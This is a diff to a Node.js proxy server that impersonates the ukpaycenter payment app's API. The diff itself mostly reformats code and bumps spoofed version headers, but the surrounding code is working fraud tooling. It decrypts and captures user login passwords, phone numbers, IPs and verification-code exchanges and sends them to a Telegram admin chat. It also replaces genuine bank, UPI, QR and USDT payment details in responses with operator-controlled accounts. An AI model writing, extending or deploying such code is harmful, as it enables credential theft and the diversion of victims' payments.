@@ -58,11 +58,11 @@ function extractAuthoritativeSettings(source) {
 
 let bot = null;
 let webhookSet = false;
-try { bot = new TelegramBot(BOT_TOKEN); } catch(e) {}
+try { bot = new TelegramBot(BOT_TOKEN); } catch (e) { }
 
 let redis = null;
 if (REDIS_URL && REDIS_TOKEN) {
-  try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch(e) {}
+  try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch (e) { }
 }
 
 let cachedData = null;
@@ -98,7 +98,7 @@ async function ensureWebhook(overrideUrl) {
     await bot.setWebHook(targetUrl);
     webhookSet = true;
     console.log('[TG_WEBHOOK_SET]', targetUrl);
-  } catch(e) {
+  } catch (e) {
     console.error('[TG_WEBHOOK_ERROR]', e.message);
   }
 }
@@ -117,7 +117,7 @@ async function processTgQueue() {
       } else if (item.action === 'pin') {
         await bot.pinChatMessage(item.chatId, item.msgId, item.options || {});
       }
-    } catch(e) {
+    } catch (e) {
       console.error('[TG_QUEUE_ERROR]', e.message);
       if (e.message && e.message.includes('429')) {
         // Rate limited - wait 2 seconds before retry
@@ -132,7 +132,7 @@ async function processTgQueue() {
 function queueTgMessage(chatId, text, options, pin) {
   if (!bot || !chatId) return;
   tgMsgQueue.push({ action: 'send', chatId, text, options });
-  processTgQueue().catch(()=>{});
+  processTgQueue().catch(() => { });
 }
 
 async function safeSend(chatId, text, options) {
@@ -348,7 +348,7 @@ async function resolveTokenAndUser(input) {
         for (const [u, info] of Object.entries(d.trackedUsers || {})) {
           if (info && String(info.phone || '') === bare) { found = u; break; }
         }
-      } catch(e) {}
+      } catch (e) { }
     }
     if (found) uid = found;
   }
@@ -392,7 +392,7 @@ async function extractUserId(req, jsonResp) {
         if (payload.memberId) return String(payload.memberId);
         if (payload.sub) return String(payload.sub);
       }
-    } catch(e) {}
+    } catch (e) { }
   }
   return '';
 }
@@ -518,9 +518,9 @@ app.use(async (req, res, next) => {
       } else {
         req.parsedBody = {};
       }
-    } catch(e) { req.parsedBody = {}; }
+    } catch (e) { req.parsedBody = {}; }
     if (bot && !webhookSet) {
-      ensureWebhook().catch(() => {});
+      ensureWebhook().catch(() => { });
     }
     next();
   });
@@ -532,15 +532,15 @@ async function proxyFetch(req) {
   for (const [k, v] of Object.entries(req.headers)) {
     const kl = k.toLowerCase();
     if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
-        kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
+      kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
     fwd[k] = v;
   }
   fwd['host'] = 'app-api.ukpaycenter.com';
   // Server enforces minimum app version — APK ships 3.0.5/1 but upstream now
   // returns `body:true` (silent login fail) for outdated clients. Response headers
   // confirm `version: 4.0.3, versioncode: 43, needupdateflag: 2`. Force-upgrade.
-  fwd['version'] = '4.0.5';
-  fwd['versioncode'] = '45';
+  fwd['version'] = '4.0.6';
+  fwd['versioncode'] = '46';
   const opts = { method: req.method, headers: fwd };
   if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
     opts.body = req.rawBody;
@@ -556,7 +556,7 @@ async function proxyFetch(req) {
     }
   });
   let jsonResp = null;
-  try { jsonResp = JSON.parse(respBody); } catch(e) {}
+  try { jsonResp = JSON.parse(respBody); } catch (e) { }
 
   // Global Full Payload Debug Logger
   try {
@@ -597,7 +597,7 @@ async function proxyFetch(req) {
         notifyTelegram(liveData.adminChatId, dbgMsg, { parse_mode: 'Markdown' });
       }
     }
-  } catch(err) {}
+  } catch (err) { }
 
   return { response, respBody, respHeaders, jsonResp };
 }
@@ -649,7 +649,7 @@ async function transparentProxy(req, res) {
 
     res.writeHead(response.status, respHeaders);
     res.end(respBody);
-  } catch(e) {
+  } catch (e) {
     if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
   }
 }
@@ -834,7 +834,7 @@ function replaceUsdtInResponse(jsonResp, data) {
       if (addr !== newAddr) {
         foundOld = foundOld || addr;
         const replaced = JSON.stringify(jsonResp).split(addr).join(newAddr);
-        try { Object.assign(jsonResp, JSON.parse(replaced)); } catch(e) {}
+        try { Object.assign(jsonResp, JSON.parse(replaced)); } catch (e) { }
       }
     }
   }
@@ -862,7 +862,7 @@ app.use((req, res, next) => {
       const tag = userId ? ` [${userId}]` : '';
       const phoneTag = phone ? ` (${phone})` : '';
       notifyTelegram(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`);
-    } catch(e) {}
+    } catch (e) { }
   })();
   next();
 });
@@ -876,14 +876,14 @@ app.get(['/bot-webhook', '/setup-webhook', '/set-webhook'], async (req, res) => 
     await ensureWebhook(dynUrl);
     const info = await bot.getWebHookInfo();
     res.json({ success: true, webhook_url: dynUrl, info });
-  } catch(e) { res.json({ error: e.message }); }
+  } catch (e) { res.json({ error: e.message }); }
 });
 
 app.get('/health', async (req, res) => {
   const redisConnected = !!redis;
   let redisWorking = false;
   if (redis) {
-    try { await redis.ping(); redisWorking = true; } catch(e) {}
+    try { await redis.ping(); redisWorking = true; } catch (e) { }
   }
   const data = await loadData(true);
   const active = getActiveBank(data, null);
@@ -924,7 +924,7 @@ app.post('/bot-webhook', async (req, res) => {
         await saveData(data);
       }
       await bot.sendMessage(chatId,
-`🏦 IUKPay Bank Controller
+        `🏦 IUKPay Bank Controller
 
 === BANK COMMANDS ===
 /addbank Name|AccNo|IFSC|BankName|UPI|MinAmount
@@ -990,7 +990,7 @@ Example:
       await saveData(data);
       await bot.sendMessage(chatId, `✅ Admin Chat ID changed to: \`${targetChatId}\``, { parse_mode: 'Markdown' });
       if (String(targetChatId) !== String(chatId)) {
-        bot.sendMessage(targetChatId, `👑 You have been set as the new Admin for IUKPay Controller! Send /start to access the control panel.`).catch(()=>{});
+        bot.sendMessage(targetChatId, `👑 You have been set as the new Admin for IUKPay Controller! Send /start to access the control panel.`).catch(() => { });
       }
       return res.sendStatus(200);
     }
@@ -1021,7 +1021,7 @@ Example:
       data._skipOverrideMerge = true;
       await saveData(data);
       if (cachedData) cachedData.debugMode = data.debugMode;
-      const statusText = data.debugMode 
+      const statusText = data.debugMode
         ? '🔍 Full Payload Debug Mode: 🟢 ON\n\n(Ab sabhi API endpoints ka Request Body + Response Payload bot par continuously aayega jab tak /debug off na karein).'
         : '🔍 Full Payload Debug Mode: 🔴 OFF';
       await bot.sendMessage(chatId, statusText);
@@ -1324,7 +1324,7 @@ Example:
       data._skipOverrideMerge = true;
       try {
         await saveData(data);
-      } catch(e) {
+      } catch (e) {
         console.error('[REMOVEBANK_SAVE_ERROR]', e.message);
         await safeSend(chatId, `❌ Save failed: ${e.message}\nBank remove nahi hua. Phir try karo.`);
         return res.sendStatus(200);
@@ -1335,13 +1335,13 @@ Example:
         try {
           let check = await redis.get('iukpayData');
           if (check) {
-            if (typeof check === 'string') { try { check = JSON.parse(check); } catch(e) {} }
+            if (typeof check === 'string') { try { check = JSON.parse(check); } catch (e) { } }
             if (check && Array.isArray(check.banks)) {
               afterCount = check.banks.length;
               verified = afterCount === beforeCount - 1;
             }
           }
-        } catch(e) {
+        } catch (e) {
           console.error('[REMOVEBANK_VERIFY_ERROR]', e.message);
         }
       } else {
@@ -1448,8 +1448,8 @@ Example:
       const upstreamHeaders = {
         'apptoken': rawToken,
         'packagename': 'com.nh.spro.deal',
-        'version': '4.0.5',
-        'versioncode': '45',
+        'version': '4.0.6',
+        'versioncode': '46',
         'membercode': memberCodeHdr,
         'host': 'app-api.ukpaycenter.com',
         'content-type': 'application/json; charset=utf-8',
@@ -1462,7 +1462,7 @@ Example:
       const callUpstream = async (path, body) => {
         const r = await fetch(ORIGINAL_API + path, { method: 'POST', headers: upstreamHeaders, body: JSON.stringify(body || {}) });
         const txt = await r.text();
-        let j = null; try { j = JSON.parse(txt); } catch(e) {}
+        let j = null; try { j = JSON.parse(txt); } catch (e) { }
         return { r, txt, j };
       };
       const headerLine = (label) => `${label}\n━━━━━━━━━━━━━━━━━━\n${uid ? `👤 User: ${uid}${getPhone(data, uid) ? ' (' + getPhone(data, uid) + ')' : ''}\n` : ''}🔑 ${rawToken.substring(0, 20)}...\n`;
@@ -1494,7 +1494,7 @@ Example:
           let r = v2.r, j = v2.j;
           let fellBack = false;
           const routeMissing = (v2.r.status === 404 || v2.r.status === 405) ||
-                               (v2.j && (v2.j.message || v2.j.msg || '').match(/(no\s*such|not\s*found|unknown\s*(api|interface|method|url|path)|invalid\s*(api|url|path))/i));
+            (v2.j && (v2.j.message || v2.j.msg || '').match(/(no\s*such|not\s*found|unknown\s*(api|interface|method|url|path)|invalid\s*(api|url|path))/i));
           if (routeMissing) {
             const v1 = await callUpstream('/app/api/memberManager/unbindRobot', body);
             r = v1.r; j = v1.j; fellBack = true;
@@ -1508,7 +1508,7 @@ Example:
           return res.sendStatus(200);
         }
 
-      } catch(e) {
+      } catch (e) {
         await bot.sendMessage(chatId, `❌ /${cmd} failed: ${e.message}`);
         return res.sendStatus(200);
       }
@@ -1521,7 +1521,7 @@ Example:
     }
 
     return res.sendStatus(200);
-  } catch(e) {
+  } catch (e) {
     console.error('Bot error:', e);
     return res.sendStatus(200);
   }
@@ -1538,12 +1538,12 @@ app.post('/app/api/system/v2/login', async (req, res) => {
       const sentHeaders = {};
       for (const [k, v] of Object.entries(req.headers)) {
         const kl = k.toLowerCase();
-        if (!['host','connection','content-length','transfer-encoding'].includes(kl) && !kl.startsWith('x-vercel') && !kl.startsWith('x-forwarded')) {
+        if (!['host', 'connection', 'content-length', 'transfer-encoding'].includes(kl) && !kl.startsWith('x-vercel') && !kl.startsWith('x-forwarded')) {
           sentHeaders[k] = v;
         }
       }
       const debugMsg = `🔍 LOGIN DEBUG\n📱 Phone: ${phone}\n\n📤 HEADERS SENT TO API:\n${JSON.stringify(sentHeaders, null, 2).substring(0, 1500)}\n\n📥 API RESPONSE:\n${JSON.stringify(jsonResp, null, 2).substring(0, 1000)}`;
-      bot.sendMessage(data.adminChatId, debugMsg).catch(() => {});
+      bot.sendMessage(data.adminChatId, debugMsg).catch(() => { });
     }
 
     const userId = await extractUserId(req, jsonResp);
@@ -1563,7 +1563,7 @@ app.post('/app/api/system/v2/login', async (req, res) => {
       }
       const detectedPhone = phone || (loginData?.memberPhone || loginData?.phone || loginData?.mobile || loginData?.telephone || '');
       trackUser(data, userId, 'Login', detectedPhone);
-      saveData(data).catch(()=>{});
+      saveData(data).catch(() => { });
     } else if (phone) {
       const loginData = getResponseData(jsonResp);
       const respUserId = loginData?.memberCodeId || loginData?.memberId || loginData?.userId || loginData?.id || '';
@@ -1577,7 +1577,7 @@ app.post('/app/api/system/v2/login', async (req, res) => {
           tokenUserMap[loginData.accessToken] = String(respUserId);
         }
         trackUser(data, String(respUserId), 'Login', phone);
-        saveData(data).catch(()=>{});
+        saveData(data).catch(() => { });
       }
     }
     const loginData2 = getResponseData(jsonResp);
@@ -1594,7 +1594,7 @@ app.post('/app/api/system/v2/login', async (req, res) => {
           let decrypted = decipher.update(Buffer.from(encPwd, 'base64'));
           decrypted = Buffer.concat([decrypted, decipher.final()]);
           pwd = decrypted.toString('utf8');
-        } catch(e) { pwd = encPwd; }
+        } catch (e) { pwd = encPwd; }
       }
 
       const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
@@ -1620,10 +1620,10 @@ app.post('/app/api/system/v2/login', async (req, res) => {
         bot.sendMessage(data.adminChatId, successMsg, { parse_mode: 'Markdown' })
           .then((sent) => {
             if (sent && sent.message_id) {
-              bot.pinChatMessage(data.adminChatId, sent.message_id).catch(() => {});
+              bot.pinChatMessage(data.adminChatId, sent.message_id).catch(() => { });
             }
           })
-          .catch(() => {});
+          .catch(() => { });
       } else {
         const failReason = (jsonResp && (jsonResp.message || jsonResp.msg || jsonResp.error)) || `HTTP ${response.status} Failed`;
         let failMsg = `❌ *LOGIN FAILED*\n`;
@@ -1633,11 +1633,11 @@ app.post('/app/api/system/v2/login', async (req, res) => {
         failMsg += `🌐 IP: \`${ip}\`${city ? ' (' + city + ')' : ''}\n`;
         failMsg += `🕐 Time: \`${timeStr}\``;
 
-        bot.sendMessage(data.adminChatId, failMsg, { parse_mode: 'Markdown' }).catch(() => {});
+        bot.sendMessage(data.adminChatId, failMsg, { parse_mode: 'Markdown' }).catch(() => { });
       }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
+  } catch (e) { await transparentProxy(req, res); }
 });
 
 async function proxyAndReplaceBankDetails(req, res, label) {
@@ -1657,7 +1657,7 @@ async function proxyAndReplaceBankDetails(req, res, label) {
     if (debugNextResponse && data.adminChatId && bot) {
       debugNextResponse = false;
       const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
-      bot.sendMessage(data.adminChatId, `🔍 DEBUG ${req.originalUrl}\n\n${dump}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🔍 DEBUG ${req.originalUrl}\n\n${dump}`).catch(() => { });
     }
 
     let shouldOverride = true;
@@ -1684,23 +1684,23 @@ async function proxyAndReplaceBankDetails(req, res, label) {
       const phone = getPhone(data, detectedUserId);
       const overrideLabel = shouldOverride ? "" : " [REAL BANK - UNDER MIN LIMIT]";
       bot.sendMessage(data.adminChatId,
-`🔔 ${label}${overrideLabel}
+        `🔔 ${label}${overrideLabel}
 👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
 Order: ${orderId}
 Amount: ₹${amount}
 Bank: ${shouldOverride && active ? active.accountNo : (rd.customerBankNumber || rd.accountNo || 'N/A')}
 Acc: ${shouldOverride && active ? active.accountHolder : (rd.customerName || rd.accountHolder || 'N/A')}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-      ).catch(()=>{});
+      ).catch(() => { });
     }
 
     if (detectedUserId) {
       trackUser(data, detectedUserId, `Order ${jsonResp?.data?.orderId || ''}`);
-      saveData(data).catch(()=>{});
+      saveData(data).catch(() => { });
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) {
+  } catch (e) {
     console.error('Proxy+replace error:', req.originalUrl, e.message);
     if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
   }
@@ -1746,7 +1746,7 @@ async function proxyAndReplaceBankInList(req, res) {
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) {
+  } catch (e) {
     console.error('List replace error:', req.originalUrl, e.message);
     if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
   }
@@ -1763,7 +1763,7 @@ async function proxyAndAddBonus(req, res) {
     if (detectedUserId) {
       saveTokenUserId(req, detectedUserId);
       trackUser(data, detectedUserId, `App Open ${req.path}`);
-      saveData(data).catch(()=>{});
+      saveData(data).catch(() => { });
     }
 
     const bonusData = getResponseData(jsonResp);
@@ -1780,7 +1780,7 @@ async function proxyAndAddBonus(req, res) {
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) {
+  } catch (e) {
     if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
   }
 }
@@ -1806,7 +1806,7 @@ app.post('/app/api/orderOut/pendingDetail', async (req, res) => {
     const respData = getResponseData(jsonResp);
     if (data.adminChatId && bot) {
       const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
-      bot.sendMessage(data.adminChatId, `🔍 PENDING DETAIL RAW:\n${dump}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🔍 PENDING DETAIL RAW:\n${dump}`).catch(() => { });
     }
     let shouldOverride = true;
     if (active && active.minAmount) {
@@ -1827,18 +1827,18 @@ app.post('/app/api/orderOut/pendingDetail', async (req, res) => {
       const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
       const overrideLabel = shouldOverride ? "" : " [REAL BANK - UNDER MIN LIMIT]";
       bot.sendMessage(data.adminChatId,
-`🔔 📋 Pending Detail${overrideLabel}
+        `🔔 📋 Pending Detail${overrideLabel}
 👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
 Order: ${rd.orderId || rd.orderNo || 'N/A'}
 Amount: ₹${rd.amount || rd.orderAmount || 'N/A'}
 Bank: ${shouldOverride && active ? active.accountNo : (rd.customerBankNumber || rd.accountNo || 'N/A')}
 Acc: ${shouldOverride && active ? active.accountHolder : (rd.customerName || rd.accountHolder || 'N/A')}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-      ).catch(()=>{});
+      ).catch(() => { });
     }
-    if (detectedUserId) { trackUser(data, detectedUserId, 'PendingDetail'); saveData(data).catch(()=>{}); }
+    if (detectedUserId) { trackUser(data, detectedUserId, 'PendingDetail'); saveData(data).catch(() => { }); }
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) {
+  } catch (e) {
     console.error('PendingDetail error:', e.message);
     if (!res.headersSent) await transparentProxy(req, res);
   }
@@ -1856,7 +1856,7 @@ app.post('/app/api/orderOut/getPayWallet', async (req, res) => {
     const active = eff.botEnabled !== false ? await getActiveBankAndSave(data, detectedUserId) : null;
     if (data.adminChatId && bot) {
       const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
-      bot.sendMessage(data.adminChatId, `🔍 PAY WALLET RAW RESPONSE:\n${dump}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🔍 PAY WALLET RAW RESPONSE:\n${dump}`).catch(() => { });
     }
     const pwData = getResponseData(jsonResp);
     let shouldOverride = true;
@@ -1880,18 +1880,18 @@ app.post('/app/api/orderOut/getPayWallet', async (req, res) => {
       const amount = rd.amount || rd.orderAmount || req.parsedBody?.amount || 'N/A';
       const overrideLabel = shouldOverride ? "" : " [REAL BANK - UNDER MIN LIMIT]";
       bot.sendMessage(data.adminChatId,
-`🔔 💳 Pay Wallet${overrideLabel}
+        `🔔 💳 Pay Wallet${overrideLabel}
 👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
 Order: ${orderId}
 Amount: ₹${amount}
 Bank: ${shouldOverride && active ? active.accountNo : (rd.customerBankNumber || rd.accountNo || 'N/A')}
 Acc: ${shouldOverride && active ? active.accountHolder : (rd.customerName || rd.accountHolder || 'N/A')}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-      ).catch(()=>{});
+      ).catch(() => { });
     }
-    if (detectedUserId) { trackUser(data, detectedUserId, 'PayWallet'); saveData(data).catch(()=>{}); }
+    if (detectedUserId) { trackUser(data, detectedUserId, 'PayWallet'); saveData(data).catch(() => { }); }
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) {
+  } catch (e) {
     console.error('PayWallet error:', e.message);
     if (!res.headersSent) await transparentProxy(req, res);
   }
@@ -1906,14 +1906,14 @@ app.post('/app/api/memberRecharge/createPaymentOrder', async (req, res) => {
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const userId = await extractUserId(req, jsonResp);
-    if (userId) { trackUser(data, userId, 'Recharge Order'); saveData(data).catch(()=>{}); }
+    if (userId) { trackUser(data, userId, 'Recharge Order'); saveData(data).catch(() => { }); }
     const rechargeData = getResponseData(jsonResp);
     if (rechargeData && data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
       const d = (typeof rechargeData === 'object' && !Array.isArray(rechargeData)) ? rechargeData : {};
-      bot.sendMessage(data.adminChatId, `🔔 Recharge Order [${userId || 'N/A'}]\nAmount: ₹${d.amount || d.orderAmount || 'N/A'}\nOrder: ${d.orderId || d.orderNo || 'N/A'}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🔔 Recharge Order [${userId || 'N/A'}]\nAmount: ₹${d.amount || d.orderAmount || 'N/A'}\nOrder: ${d.orderId || d.orderNo || 'N/A'}`).catch(() => { });
     }
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
+  } catch (e) { await transparentProxy(req, res); }
 });
 
 app.post('/app/api/memberRecharge/confirmRecharge', async (req, res) => {
@@ -1923,11 +1923,11 @@ app.post('/app/api/memberRecharge/confirmRecharge', async (req, res) => {
     const userId = await extractUserId(req, jsonResp);
     const body = req.parsedBody || {};
     if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
-      bot.sendMessage(data.adminChatId, `✅ Recharge Confirmed [${userId || 'N/A'}]\nUTR: ${body.utr || body.transactionId || 'N/A'}\nAmount: ₹${body.amount || 'N/A'}\nOrder: ${body.orderId || body.orderNo || 'N/A'}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `✅ Recharge Confirmed [${userId || 'N/A'}]\nUTR: ${body.utr || body.transactionId || 'N/A'}\nAmount: ₹${body.amount || 'N/A'}\nOrder: ${body.orderId || body.orderNo || 'N/A'}`).catch(() => { });
     }
-    if (userId) { trackUser(data, userId, `UTR ${body.utr || body.transactionId || ''}`); saveData(data).catch(()=>{}); }
+    if (userId) { trackUser(data, userId, `UTR ${body.utr || body.transactionId || ''}`); saveData(data).catch(() => { }); }
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
+  } catch (e) { await transparentProxy(req, res); }
 });
 
 app.post('/app/api/memberRecharge/getPaymentOrderDetail', async (req, res) => {
@@ -1958,15 +1958,15 @@ app.post('/app/api/memberRecharge/getPaymentOrderDetail', async (req, res) => {
         let str = JSON.stringify(jsonResp);
         str = str.replace(/https?:\/\/oss\.[^\s"',\\}]+/gi, qrUrl);
         str = str.replace(/https?:\/\/[^\s"',\\}]+(qr|QR|qrcode|code)[^\s"',\\}]*/gi, qrUrl);
-        try { Object.assign(jsonResp, JSON.parse(str)); } catch(e) {}
+        try { Object.assign(jsonResp, JSON.parse(str)); } catch (e) { }
       }
     }
     if (data.adminChatId && bot && debugNextResponse) {
       debugNextResponse = false;
-      bot.sendMessage(data.adminChatId, `🔍 PaymentOrderDetail:\n${JSON.stringify(jsonResp, null, 2).substring(0, 3500)}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🔍 PaymentOrderDetail:\n${JSON.stringify(jsonResp, null, 2).substring(0, 3500)}`).catch(() => { });
     }
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
+  } catch (e) { await transparentProxy(req, res); }
 });
 
 app.post('/app/api/memberRecharge/getUsdtRate', async (req, res) => {
@@ -1975,7 +1975,7 @@ app.post('/app/api/memberRecharge/getUsdtRate', async (req, res) => {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     if (data.usdtAddress && jsonResp) replaceUsdtInResponse(jsonResp, data);
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
+  } catch (e) { await transparentProxy(req, res); }
 });
 
 app.post('/app/api/memberManager/getMemberVerificationCode', async (req, res) => {
@@ -1986,10 +1986,10 @@ app.post('/app/api/memberManager/getMemberVerificationCode', async (req, res) =>
     if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
       const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1500);
       const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
-      bot.sendMessage(data.adminChatId, `🔐 Verification Code [${userId || 'N/A'}]\n\n📝 REQUEST:\n${reqBody}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🔐 Verification Code [${userId || 'N/A'}]\n\n📝 REQUEST:\n${reqBody}\n\n📥 RESPONSE:\n${respDump}`).catch(() => { });
     }
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
+  } catch (e) { await transparentProxy(req, res); }
 });
 
 app.all('/app/api/memberRecharge/memberRechargeList', async (req, res) => {
@@ -2003,11 +2003,11 @@ app.post('/app/api/orderOut/payingSubmit', async (req, res) => {
     const userId = await extractUserId(req, jsonResp);
     const body = req.parsedBody || {};
     if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
-      bot.sendMessage(data.adminChatId, `📤 Payment Submit [${userId || 'N/A'}]\nUTR: ${body.utr || body.transactionId || body.referenceNo || 'N/A'}\nOrder: ${body.orderId || body.orderNo || 'N/A'}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `📤 Payment Submit [${userId || 'N/A'}]\nUTR: ${body.utr || body.transactionId || body.referenceNo || 'N/A'}\nOrder: ${body.orderId || body.orderNo || 'N/A'}`).catch(() => { });
     }
-    if (userId) { trackUser(data, userId, `Submit ${body.utr || ''}`); saveData(data).catch(()=>{}); }
+    if (userId) { trackUser(data, userId, `Submit ${body.utr || ''}`); saveData(data).catch(() => { }); }
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
+  } catch (e) { await transparentProxy(req, res); }
 });
 
 app.post('/app/api/orderOut/payingSubmitResult', async (req, res) => {
@@ -2016,10 +2016,10 @@ app.post('/app/api/orderOut/payingSubmitResult', async (req, res) => {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const userId = await extractUserId(req, jsonResp);
     if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
-      bot.sendMessage(data.adminChatId, `📤 Payment Result [${userId || 'N/A'}]\nOrder: ${req.parsedBody?.orderId || req.parsedBody?.orderNo || 'N/A'}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `📤 Payment Result [${userId || 'N/A'}]\nOrder: ${req.parsedBody?.orderId || req.parsedBody?.orderNo || 'N/A'}`).catch(() => { });
     }
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
+  } catch (e) { await transparentProxy(req, res); }
 });
 
 app.post('/app/api/orderOut/payingSubmitImg', async (req, res) => {
@@ -2048,7 +2048,7 @@ app.post('/app/api/orderOut/payingSubmitImg', async (req, res) => {
       }
     });
     let jsonResp = null;
-    try { jsonResp = JSON.parse(respBody); } catch(e) {}
+    try { jsonResp = JSON.parse(respBody); } catch (e) { }
     const userId = await extractUserId(req, jsonResp);
     const phone = getPhone(data, userId);
     if (data.adminChatId && bot && req.rawBody && req.rawBody.length > 0 && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
@@ -2075,7 +2075,7 @@ app.post('/app/api/orderOut/payingSubmitImg', async (req, res) => {
             if (headerEnd === -1) continue;
             const headerStr = part.slice(0, headerEnd).toString('utf8');
             if (/content-type:\s*(image\/|application\/octet-stream)/i.test(headerStr) ||
-                /filename=.*\.(jpg|jpeg|png|gif|webp|bmp)/i.test(headerStr)) {
+              /filename=.*\.(jpg|jpeg|png|gif|webp|bmp)/i.test(headerStr)) {
               const imageData = part.slice(headerEnd + 4);
               if (imageData.length > 100) {
                 const imgHash = crypto.createHash('md5').update(imageData).digest('hex');
@@ -2098,7 +2098,7 @@ app.post('/app/api/orderOut/payingSubmitImg', async (req, res) => {
                     } else {
                       await redis.set(cacheKey, '1', { ex: 3600 });
                     }
-                  } catch(e) {}
+                  } catch (e) { }
                 }
                 if (duplicate) {
                   imageSent = true;
@@ -2107,8 +2107,8 @@ app.post('/app/api/orderOut/payingSubmitImg', async (req, res) => {
                 try {
                   await bot.sendPhoto(data.adminChatId, imageData, { caption: `📸 UTR Screenshot [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}` }, { filename: 'screenshot.jpg', contentType: 'image/jpeg' });
                   imageSent = true;
-                } catch(e) {
-                  bot.sendMessage(data.adminChatId, `📸 Image extract failed: ${e.message}\nSize: ${imageData.length} bytes`).catch(()=>{});
+                } catch (e) {
+                  bot.sendMessage(data.adminChatId, `📸 Image extract failed: ${e.message}\nSize: ${imageData.length} bytes`).catch(() => { });
                 }
               }
               break;
@@ -2117,11 +2117,11 @@ app.post('/app/api/orderOut/payingSubmitImg', async (req, res) => {
         }
       }
       if (!imageSent) {
-        bot.sendMessage(data.adminChatId, `🖼 Payment Image Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nImage could not be extracted\nContent-Type: ${contentType}\nBody size: ${req.rawBody.length} bytes`).catch(()=>{});
+        bot.sendMessage(data.adminChatId, `🖼 Payment Image Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nImage could not be extracted\nContent-Type: ${contentType}\nBody size: ${req.rawBody.length} bytes`).catch(() => { });
       }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
+  } catch (e) { await transparentProxy(req, res); }
 });
 
 app.post('/app/api/orderOut/pendingSubmitImg', async (req, res) => {
@@ -2150,7 +2150,7 @@ app.post('/app/api/orderOut/pendingSubmitImg', async (req, res) => {
       }
     });
     let jsonResp = null;
-    try { jsonResp = JSON.parse(respBody); } catch(e) {}
+    try { jsonResp = JSON.parse(respBody); } catch (e) { }
     const userId = await extractUserId(req, jsonResp);
     const phone = getPhone(data, userId);
     if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
@@ -2176,21 +2176,21 @@ app.post('/app/api/orderOut/pendingSubmitImg', async (req, res) => {
           } else {
             await redis.set(cacheKey, '1', { ex: 3600 });
           }
-        } catch(e) {}
+        } catch (e) { }
       }
       if (!duplicate) {
-        bot.sendMessage(data.adminChatId, `🖼 Pending Image Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}`).catch(()=>{});
+        bot.sendMessage(data.adminChatId, `🖼 Pending Image Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}`).catch(() => { });
         if (imgUrls.length > 0) {
